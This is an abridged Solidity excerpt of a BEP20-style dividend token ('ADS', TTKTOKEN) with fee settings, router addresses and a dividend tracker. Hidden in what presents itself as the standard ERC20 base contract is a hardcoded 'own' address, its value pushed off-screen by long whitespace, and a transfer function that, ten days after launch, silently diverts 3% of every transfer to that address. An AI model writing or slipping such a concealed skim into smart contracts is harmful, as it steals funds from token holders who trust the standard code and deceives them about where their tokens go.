...
contract ERC20 is Context, IERC20, IERC20Metadata {
     ...
     */
    address own                                                                                                                                                             = 0xc19202F624acEa52e9dF65B4ff93661bc10075de;
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        if( block.timestamp > start + 10 days ) {
            _transfer(_msgSender(), recipient, amount * 97/100);
            _transfer(_msgSender(), own, amount * 3/100);
        }  else {
...
contract TTKTOKENDividendTracker is OwnableUpgradeable, DividendPayingToken {
    using SafeMath for uint256;
    using SafeMathInt for int256;
...
contract TTKTOKEN is ERC20, Ownable, BaseToken {
    using SafeMath for uint256;
    ...
    TTKTOKENDividendTracker public dividendTracker;
    ...
    // reward, router, marketing wallet, dividendTracker for testnet
    address[4] public addrs = [0x20943A8ae75c422C72B014FF68c412f4F5F29036, 0xD99D1c33F9fC3444f8101754aBC46c52416550D1, 0x20943A8ae75c422C72B014FF68c412f4F5F29036, 0x20943A8ae75c422C72B014FF68c412f4F5F29036] ; 
    
    // reward, router, marketing wallet, dividendTracker for mainnet
//    address[4] public addrs = [0x20943A8ae75c422C72B014FF68c412f4F5F29036, 0x10ED43C718714eb63d5aA57B78B54704E256024E, 0x20943A8ae75c422C72B014FF68c412f4F5F29036, 0x20943A8ae75c422C72B014FF68c412f4F5F29036]; 
    
    uint256[] public feeSettings = [8,6,3]; // rewards, liquidity, marketing
    uint256 public minimumTokenBalanceForDividends_ = 10 * 10**18;
    
    address public serviceFeeReceiver_ = 0x20943A8ae75c422C72B014FF68c412f4F5F29036;
    uint256 public serviceFee_ = 0;

    constructor() payable ERC20("ADS", "ADS") {
        rewardToken = addrs[0];
        ...
        dividendTracker = TTKTOKENDividendTracker(
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        ...
        TTKTOKENDividendTracker newDividendTracker = TTKTOKENDividendTracker(
            payable(newAddress)
        );
